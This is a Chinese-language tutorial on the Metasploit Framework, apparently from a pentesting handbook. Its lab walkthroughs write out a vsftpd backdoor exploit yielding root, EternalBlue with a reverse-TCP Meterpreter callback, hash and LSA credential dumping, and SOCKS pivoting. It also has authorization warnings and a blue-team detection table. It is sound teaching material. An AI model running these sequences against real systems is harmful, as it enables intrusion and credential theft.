# Metasploit Framework（漏洞利用框架）

> **一句话**：把「发现漏洞 → 选择利用模块 → 配置 Payload → 建立会话」串成一条标准流水线的渗透测试框架。
> **分类**：漏洞利用 ｜ **Kali 包**：`metasploit-framework`（主命令 `msfconsole`、`msfdb`、`msfvenom`）｜ **官方文档**：<https://docs.metasploit.com/>

---

## 1. 它解决什么问题

渗透测试中「拿到一个 CVE」和「真正打进去」之间隔着一堆体力活：找 PoC、改参数、选编码器、配反弹地址、处理依赖、上传、执行、维持会话。Metasploit 把这些步骤模板化：

| 你的需求 | 手工做法 | Metasploit 做法 |
|----------|----------|-----------------|
| 找 PoC | 去 Exploit-DB 搜、下载、读代码 | `search cve:2021-44228` 直接列出模块 |
| 生成 Payload | 手写 shellcode / 编译 | `msfvenom` 一条命令 |
| 建立反弹会话 | `nc -lvnp 4444` 管道 | `exploit` 后自动进 `meterpreter` |
| 沉淀资产 | 自己记笔记 | 内置数据库 + workspace，`hosts`/`creds`/`loot` 可查 |

与同类工具对比：

- **vs `searchsploit`/Exploit-DB**：Exploit-DB 是**原始 PoC 仓库**，Metasploit 是**可执行模块框架**。前者要求你会读 C/Python 并自己编译调试，后者给你参数化接口。两者互补，见 [`searchsploit.md`](searchsploit.md)。
- **vs `sqlmap`/`beef-xss`**：那些是**专项工具**（SQL 注入、浏览器），Metasploit 是**通用框架**，覆盖面广但单点深度不如专精工具。
- **vs Sliver / Cobalt Strike**：后两者专注 C2（命令控制）与隐蔽性；Metasploit 的强项是「打点 + 快速验证」，C2 能力弱一些。见 [`../12-基础设施与C2/sliver.md`](../12-基础设施与C2/sliver.md)。

---

## 2. 工作原理

### 2.1 分层架构

```
┌──────────────────────────────────────────┐
│ msfconsole  /  msfcli(已废弃) / msgrpc   │  ← 用户界面层
├──────────────────────────────────────────┤
│ Rex（协议/套接字/编码）                    │
│ Msf::Core（模块加载、事件、Session 管理）  │  ← 核心库层
│ Msf::Base（数据库、Host/Service/Cred）    │
├──────────────────────────────────────────┤
│ 模块（Modules）：exploit / payload /      │  ← 模块层
│ auxiliary / post / encoder / nop / evasion│
├──────────────────────────────────────────┤
│ 数据库（PostgreSQL，可选但强烈建议）       │  ← 持久层
└──────────────────────────────────────────┘
```

模块目录在 `/usr/share/metasploit-framework/modules/`，按用途分子目录：

| 类型 | 作用 | 例子 |
|------|------|------|
| `exploit` | 真正触发漏洞并投递 Payload | `exploit/windows/smb/ms17_010_eternalblue` |
| `auxiliary` | 扫描 / 爆破 / 嗅探，不建立会话 | `auxiliary/scanner/smb/smb_version` |
| `payload` | 被投递的代码（**单段** stageless / **分段** staged） | `windows/x64/meterpreter/reverse_tcp` |
| `encoder` | 对 Payload 编码以规避坏字符 | `x86/shikata_ga_nai` |
| `nop` | 生成 NOP 滑板 | `x86/opty2` |
| `post` | 会话建立后的后渗透动作 | `post/multi/gather/enum_network` |
| `evasion` | 针对杀软/EDR 的规避（较新） | `windows/windows_defender_exe` |

**staged vs stageless**：`windows/x64/meterpreter/reverse_tcp` 是**分段**（先投小 stub，再回连拉取完整 Meterpreter）；`windows/x64/meterpreter_reverse_tcp`（**无斜杠分隔的 payload 名**）是**单段**，体积大但不依赖二次回连。段内分隔符 `/` 是判断依据。

### 2.2 数据库与 workspace

`msfdb` 在本地起 PostgreSQL，存 `hosts`（主机）、`services`（端口/服务）、`vulns`（漏洞）、`creds`（凭据）、`loot`（战利品）、`notes`。**workspace** 是逻辑隔离的命名空间——一个客户一个 workspace，避免数据串味。

### 2.3 会话（Session）

`exploit` 成功后返回 session id。Meterpreter 是内存中的高级 shell，支持 `migrate`（迁移进程）、`hashdump`、`portfwd`（端口转发）、`socks`（内网代理）、`load`（加载扩展如 `kiwi` = Mimikatz）。

---

## 3. 安装与快速上手

Kali 默认已预装，否则：

```bash
sudo apt update
sudo apt install metasploit-framework

command -v msfconsole msfvenom msfdb
```

初始化数据库（**第一次必须做**，否则 `db_status` 报错）：

```bash
sudo msfdb init          # 创建数据库 + 用户
sudo systemctl enable --now postgresql
msfconsole -q            # -q 不打印 banner
```

```console
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

常用启动参数：

```bash
msfconsole -q                    # 静默启动
msfconsole -r setup.rc           # 启动即执行资源脚本
msfconsole -x "use ...; run"     # 启动即执行命令
```

```bash
msfconsole --help | head -30
```

---

## 4. 核心参数详解（msfconsole 内命令）

| 参数/命令 | 作用 | 使用建议 |
|-----------|------|----------|
| `search <关键词>` | 搜索模块 | 支持 `cve:2021-44228`、`type:exploit`、`platform:windows`、`name:`、`rank:excellent` |
| `use <模块路径>` | 加载模块 | 支持编号：`use 3` |
| `info` | 看模块说明与选项 | **动手前必读**，尤其 `References` 与 `Rank` |
| `show options` | 列出必填项 | `Required=yes` 且无 `Current Setting` 的必须补 |
| `show targets` / `show payloads` | 目标系统 / 兼容 Payload | `set target 2`、`set payload ...` |
| `show advanced` | 高级选项 | 调 `WfsDelay`、`AutoRunScript`、`ExitOnSession` |
| `set` / `setg` | 设置参数 / **全局**参数 | `setg LHOST eth0` 一次设好，全局复用 |
| `unset` / `unsetg` | 清除参数 | 改错时用 |
| `check` | 只探测不打（漏洞验证） | **授权测试首选**，低风险确认可利用性 |
| `exploit` / `run` | 执行（`run` 是别名） | `exploit -j` 后台任务化，`-z` 成功后不自动进会话 |
| `sessions` | 列出会话 | `sessions -l` 列表、`sessions -i 1` 进入、`-k 1` 关闭 |
| `sessions -u` | 把普通 shell 升级为 Meterpreter | 拿到底层 shell 后升级 |
| `workspace` | 管理命名空间 | `workspace -a clientA`、`workspace clientA` |
| `hosts` / `services` / `creds` / `loot` | 查看数据库资产 | `hosts -R` 把主机列表灌进 `RHOSTS` |
| `db_nmap` | nmap 扫描并自动入库 | 比裸 nmap 多一步自动 `services` 入库 |
| `db_import` | 导入 nmap/nessus XML | 已有扫描结果时用 |
| `spool` | 会话输出双写到文件 | `spool /tmp/msf.log` 便于写报告 |
| `resource` | 执行资源脚本 | 自动化，见下文 |
| `makerc` | 把本次命令历史存成 .rc | 复盘/复用一键搞定 |
| `back` / `previous` | 退出模块 / 回上一个模块 | 排查时来回切换 |

---

## 5. 实战演练

> **环境声明**：以下全部操作仅限**授权测试**或**自建靶机**。推荐靶场：本机虚拟机装 **Metasploitable 2/3**，或 HackTheBox / TryHackMe / VulnHub 的免费靶机（如 `blue`、`legacy`）。攻击机 Kali 与靶机放同一 NAT/仅主机网络。**禁止对未授权主机执行。**

### 场景 1：从零到第一个 Meterpreter 会话（Metasploitable 2，vsftpd 后门）

```console
msf6 > db_nmap -sV -p- 192.168.56.102
[*] Nmap: 21/tcp   open  ftp     vsftpd 2.3.4
[*] Nmap: 22/tcp   open  ssh     OpenSSH 4.7p1
```

`db_nmap` 跑完，`services` / `hosts` 已自动入库：

```console
msf6 > hosts
address         mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---  ----  -------  ---------  -----  -------  ----  --------
192.168.56.102             Linux    Debian            server

msf6 > services
host            port  proto  name  state  info
----            ----  -----  ----  -----  ----
192.168.56.102  21    tcp    ftp   open   vsftpd 2.3.4
```

先验证再打（`check`）：

```console
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info
       Name: VSFTPD 2.3.4 Backdoor
     Rank: Excellent
msf6 exploit(...) > check
[+] 192.168.56.102:21 - The target is vulnerable.
```

配置并执行（payload 这里用普通 shell 即可）：

```console
msf6 exploit(...) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102
msf6 exploit(...) > set payload cmd/unix/interact
msf6 exploit(...) > exploit -z
[*] Command shell session 1 opened (192.168.56.101:39271 -> 192.168.56.102:6200)
msf6 exploit(...) > sessions -i 1
id
uid=0(root) gid=0(root)
```

**解读**：`[+] The target is vulnerable.` 是 `check` 的正面结论；`Command shell session 1 opened` 是会话建立成功的标志。此处直接是 `uid=0`。

### 场景 2：Meterpreter 会话的后渗透链条（Windows 靶机）

以 HTB `blue`（MS17-010）为例：

```console
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.129.0.0/24
msf6 exploit(...) > setg LHOST tun0        # HTB 用 tun0
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > run
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.129.x.x:49231)
```

拿到会话后的标准动作顺序：

```console
meterpreter > sysinfo                 # 确认系统与架构
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs                # 看当前令牌特权
meterpreter > getsystem               # 尝试提权（常已 SYSTEM）
meterpreter > hashdump                # 抓 SAM 中的 NTLM 哈希
meterpreter > migrate 1234            # 迁移到稳定进程，避免会话掉线
meterpreter > load kiwi               # 加载 Mimikatz 扩展
meterpreter > lsa_dump_sam
meterpreter > run post/multi/recon/local_exploit_suggester
```

内网横向：把被控机当跳板，用 `autoroute` + `socks_proxy` 打通流量，再用 `proxychains4` 驱动其他工具：

```console
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```

```bash
# 另一个终端：让 nmap 走 1080 端口的 SOCKS5
sudo proxychains4 -q nmap -sT -Pn -p 445,3389 10.10.10.20
```

> **注意**：`autoroute` 只对 Metasploit 自己发起的流量生效；外部工具要走 SOCKS 代理，并且 **必须用 `-sT`（TCP connect 扫描）**，因为 proxychains 只支持 TCP，不支持 ICMP/UDP。详见 [`../08-后渗透/proxychains4.md`](../08-后渗透/proxychains4.md)。

### 场景 3：workspace + 资源脚本，把流程沉淀下来

```console
msf6 > workspace -a clientA
[*] Added workspace: clientA
msf6 > workspace clientA
```

把一套重复动作写进 `smb_enum.rc`：

```ruby
# smb_enum.rc —— 批量 SMB 枚举
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
set THREADS 16
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.0/24
run
```

```console
msf6 > resource smb_enum.rc
msf6 > hosts          # 结果已入库
msf6 > services -S 445
msf6 > spool /tmp/clientA.log
msf6 > makerc clientA_setup.rc     # 把本次所有命令存成脚本，下次直接 resource
```

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `check` 返回 `The target is vulnerable.` | 漏洞确认存在 | 可以 `exploit` |
| `The target is not exploitable.` | 补丁已打或条件不符 | 换模块/换目标 |
| `Auxiliary module execution completed` | 扫描类模块跑完 | 看 `services`/`creds` 表 |
| `Meterpreter session N opened` | 会话建立 | `sessions -i N` |
| `Exploit completed, but no session was created` | 打了但没回连 | **九成是 LHOST/防火墙/端口**问题，查第 8 节 |
| `Rank: Excellent/Great/Good/Normal/Average/Low/Manual` | 模块可靠度 | 优先 Excellent，`Manual` 需人工介入 |
| `[*] Started reverse TCP handler on 0.0.0.0:4444` | 监听器已起 | 等目标回连 |

---

## 7. 与其他工具配合

```
searchsploit 找 PoC ──► (无 msf 模块时) 手工编译执行
        │
        └─► msfconsole search cve:XXXX ──► use/check/exploit ──► Meterpreter
                                                                   │
   nmap/db_nmap ── 资产入库 ──────────────────────────────────────┤
                                                                   ├─► hashdump ──► hashcat 破解
                                                                   ├─► load kiwi ──► 明文/哈希 ──► impacket 复用
                                                                   ├─► autoroute+socks ──► proxychains4 ──► 内网
                                                                   └─► msfvenom 生成新 Payload 打第二台
```

- 生成 Payload 见 [`msfvenom.md`](msfvenom.md)；无 Metasploit 模块的漏洞见 [`searchsploit.md`](searchsploit.md)。
- 抓到的哈希拿去 `hashcat -m 1000` 破解，再用 [`../08-后渗透/impacket.md`](../08-后渗透/impacket.md) 横向。
- 浏览器侧利用用 [`beef-xss.md`](beef-xss.md)。

---

## 8. 常见坑与排错

| 报错 | 原因 | 解决 |
|------|------|------|
| `[-] Database not connected` | 没初始化/PostgreSQL 没起 | `sudo msfdb init && sudo systemctl start postgresql` |
| `Exploit completed, but no session was created` | LHOST 写错（最常见）、目标出网被拦、Payload 架构不匹配 | `ip a` 确认真实网卡 IP；Kali 上设 `LHOST tun0/eth1`；`show targets` 对齐架构 |
| `setg LHOST` 设成了 `127.0.0.1` | 习惯性照抄 | 靶机场景必须是被控机**能路由到**的地址 |
| PowerShell Payload 报 `AMSI` / 被 Defender 删 | 杀软拦截 | 换 `evasion` 模块、编码、改无文件投递；仅授权环境 |
| Meterpreter 会话秒断 | 进程被杀 / 网络抖动 | `migrate` 到 `explorer.exe`、`set AutoRunScript`、`WfsDelay` 调大 |
| `msfupdate` 报权限错 | 新版用 apt 管理 | 用 `sudo apt update && sudo apt install metasploit-framework` 升级 |
| `exploit/... not found` | 模块路径拼错 | `search` 拿准确路径，别手打 |
| 扫描结果为空但主机确实在线 | 主机没进 workspace | `workspace` 确认当前命名空间；`hosts` 检查 |
| 一段命令太长总敲错 | —— | `makerc` 存档 + `resource` 复用 |

---

## 9. 防御视角（蓝队）

| 攻击面 | 检测信号 | 缓解措施 |
|--------|----------|----------|
| SMB 漏洞（MS17-010 等） | 445 上异常 SMB 协商、`EternalBlue` 特征 | 打补丁、**禁用 SMBv1**、SMB 签名强制 |
| 反弹会话 | 内网主机异常**出站**连接（非常规端口 4444/8080）、长连接小心跳 | 出站白名单、EDR 网络行为告警 |
| Meterpreter 内存驻留 | 进程注入（`CreateRemoteThread`）、LSASS 被读 | Credential Guard、LSASS PPL、EDR |
| `hashdump` / `lsa_dump` | 注册表 SAM/SECURITY 句柄访问、4624 类型 3 异常登录 | LAPS、最小权限、凭据轮换 |
| 横向 SMB/WinRM | 4624/4625 爆破痕迹、4688 异常父进程（`services.exe`→`cmd.exe`） | Windows 防火墙分域、网络分段、禁用 NTLM |
| 资源脚本批量扫描 | 单个源 IP 短时间内大量 445/139 连接 | IDS/IPS 阈值告警、蜜罐 |

Meterpreter 的默认证书与流量特征已被主流 IDS 覆盖，**未授权使用必然留痕**。

---

## 10. 参考

- Metasploit 官方文档：<https://docs.metasploit.com/>
- Metasploit Unleashed（免费教程）：<https://www.offsec.com/metasploit-unleashed/>
- Kali 工具页：<https://www.kali.org/tools/metasploit-framework/>
- `man msfconsole`、`msfconsole --help`、模块内 `info`

## ⚠️ 法律与伦理

未经授权访问他人计算机系统，在我国可能触犯《刑法》第 285 条（非法侵入计算机信息系统罪、非法获取计算机信息系统数据罪）、第 286 条（破坏计算机信息系统罪），并可能承担民事赔偿责任。Metasploit 属高风险双刃工具，**仅可在书面授权的渗透测试、CTF 竞赛、自建靶场与教学环境中使用**。上机前务必确认授权范围（IP 段、时间段、允许的手法），并做好操作留痕。
